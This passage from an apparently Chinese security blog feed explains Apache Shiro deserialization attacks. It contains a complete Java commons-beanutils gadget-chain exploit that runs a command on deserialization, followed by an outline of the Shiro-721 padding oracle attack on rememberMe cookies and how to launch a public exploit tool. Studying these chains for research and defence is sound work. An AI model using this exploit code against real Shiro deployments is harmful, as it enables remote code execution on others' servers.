 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的内部调用了 <code>newTransformer()</code>，而 <code>getOutputProperties</code> 这个名字，是以 <code>get</code> 开头，正符合getter的定义。</p><p>所以， <code>PropertyUtils.getProperty( obj, property )</code> 这段代码，当obj是一个 <code>TemplatesImpl</code> 对象，而 <code>property</code> 的值为 <code>outputProperties</code> 时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code> 方法，触发代码执行。</p><p><img src="../images/20220503224944.png" alt="img"></p><p><strong>这就是一条cb链而已</strong>     <strong>但是这个cb链和上面给的链接的cb链子不是一回事</strong></p><p><strong>因为用的依赖不同</strong>    <strong>所以如果直接用上面的cb链来打的话会执行失败并且报错</strong>   </p><p>所以这里得重新构造(<strong>但是区别不是很大</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="comment">//这个add里的数值要注意一下，必须传的是string类型，不然会报错</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面常规的cb链不同的是   </p><p><img src="../images/image-20230620154157363.png" alt="image-20230620154157363"></p><p>将这里进行了修改  因为就是如果不修改的话会报错</p><p><img src="../images/image-20230620154306119.png" alt="image-20230620154306119"></p><p>就是会报这个错误</p><p><img src="../images/image-20230620154552684.png" alt="image-20230620154552684"></p><p>然后就解决了这个问题，就可以成功进行恶意代码执行了</p><p><img src="../images/image-20230620154446944.png" alt="image-20230620154446944"></p><p><a href="http://arsenetang.com/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/#The-first-%E6%8A%A5%E9%94%99">Shiro中常见的三种错误 </a>    <strong>在复现shiro的过程中如果遇到问题可以来看看这里  基本都能得到解决</strong></p><h2 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro-721反序列化漏洞"></a>Shiro-721反序列化漏洞</h2><p><a href="https://goodapple.top/archives/261">参考文章</a>   </p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>虽然使用Padding Oracle Attack<strong>可以绕过密钥直接构造攻击密文</strong>，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><ul><li>登录网站获取合法Cookie</li><li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li><li>利用intermediary构造出恶意的反序列化密文作为Cookie</li><li>使用新的Cookie请求网站执行攻击</li></ul><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><strong>Shiro  &lt;=1.4.1</strong></li></ul><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>将<code>shrio-550</code>的的版本换掉就行</p><p><img src="../images/image-20230620163656141.png" alt="image-20230620163656141"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="密钥分析"><a href="#密钥分析" class="headerlink" title="密钥分析"></a>密钥分析</h4><p><img src="../images/image-20230620163758041.png" alt="image-20230620163758041"></p><p>跟进<code>generateNewKey</code>()</p><p><img src="../images/image-20230620163822678.png" alt="image-20230620163822678"></p><p>在接着跟进<code>generateNewKey</code></p><p><img src="../images/image-20230620163850243.png" alt="image-20230620163850243"></p><p>然后接着跟进<code>init</code></p><p><img src="../images/image-20230620163925489.png" alt="image-20230620163925489"></p><p>在接着跟进<code>init</code></p><p><img src="../images/image-20230620163954395.png" alt="image-20230620163954395"></p><p><img src="../images/image-20230620164051151.png" alt="image-20230620164051151"></p><p>获取完新的key之后，回到这里进行编码</p><p><img src="../images/image-20230620164134997.png" alt="image-20230620164134997"></p><p><img src="../images/image-20230620164158552.png" alt="image-20230620164158552"></p><p>加密方法还是<code>AES</code></p><p><img src="../images/image-20230620164246098.png" alt="image-20230620164246098"></p><p>最后跟进这个<code>setCipherKey</code>   就是将新生成的key来作为加密和解密的key</p><p><strong>至此就是Shiro721完整的密钥生成过程。</strong></p><h4 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h4><p>我们知道，Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件。在<a href="https://goodapple.top/2022/01/06/6db157fde87a6bae/">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a>这篇文章中，我们模拟的服务器环境如下</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的Cookie，Shiro是怎么处理的呢？</p><p>(<strong>这里的话<code>Padding Oracle Attack</code>就不详细分析了，只讲结论</strong>)</p><ul><li><strong>Padding正确，服务器正常响应</strong></li><li><strong>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></strong></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p><p>利用链和Shiro550类似，这里我们使用<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">ShiroExploit.V2.51</a>工具进行攻击测试。输入测试网址以及登录用户的Cookie</p><p><strong>然后就可以利用工具进行测试了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\ShiroExploit.jar</span><br></pre></td></tr></table></figure><p><strong>这是我的启动方式  (因为环境变量是17，用不了)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7133959651653058574&quot;&gt;参考文章1&lt;/a&gt;     &lt;a href=&quot;https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.</summary>
      
    
    
    
    
    <category term="java-shiro" scheme="https://ke1nys.github.io/tags/java-shiro/"/>
    
  </entry>
  
</feed>
